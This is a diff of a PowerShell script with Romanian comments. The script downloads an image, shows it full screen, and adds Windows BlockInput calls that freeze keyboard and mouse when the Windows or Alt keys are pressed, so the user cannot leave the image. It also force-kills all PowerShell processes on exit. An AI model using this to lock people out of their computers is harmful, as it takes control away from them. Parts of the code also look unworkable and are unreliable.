@@ -2,27 +2,25 @@
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $tempImagePath = "$env:TEMP\image.jpg"
 
-# Importă funcționalități din user32.dll
+# Importă funcționalități din user32.dll pentru blocarea tastelor
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
-public class KeyboardInterceptor {
+
+public class Interceptor {
     [DllImport("user32.dll")]
-    public static extern short GetAsyncKeyState(int vKey);
+    public static extern int BlockInput(bool block);
 }
 "@
 
-# Blochează tastele critice (Windows și Alt)
-function Block-Keys {
-    while ($true) {
-        Start-Sleep -Milliseconds 100
-        if ([KeyboardInterceptor]::GetAsyncKeyState(0x5B) -ne 0) { # Tasta Windows
-            Start-Sleep -Milliseconds 100
-        }
-        if ([KeyboardInterceptor]::GetAsyncKeyState(0x12) -ne 0) { # Tasta Alt
-            Start-Sleep -Milliseconds 100
-        }
-    }
+# Blochează tastatura și mouse-ul
+function Block-Input {
+    [Interceptor]::BlockInput($true)
+}
+
+# Deblochează tastatura și mouse-ul
+function Unblock-Input {
+    [Interceptor]::BlockInput($false)
 }
 
 # Descărcare imagine
@@ -87,11 +85,27 @@ function Show-FullScreenImage {
 # Funcție pentru oprirea completă a aplicației (folosind `cdr`)
 function Stop-All {
     $global:exitFlag = $true
+    Unblock-Input
     Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
     exit
 }
 
-# Executare aplicație principală și monitorizare
+# Monitorizare și blocare taste
+function Monitor-And-Block {
+    while ($true) {
+        Start-Sleep -Milliseconds 100
+        if ([System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftWindows) -or
+            [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightWindows) -or
+            [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftAlt) -or
+            [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightAlt)) {
+            Block-Input
+            Start-Sleep -Milliseconds 100
+            Unblock-Input
+        }
+    }
+}
+
+# Pornire aplicație principală
 Download-Image
-Start-Job -ScriptBlock { Block-Keys }
+Start-Job -ScriptBlock { Monitor-And-Block }
 Show-FullScreenImage
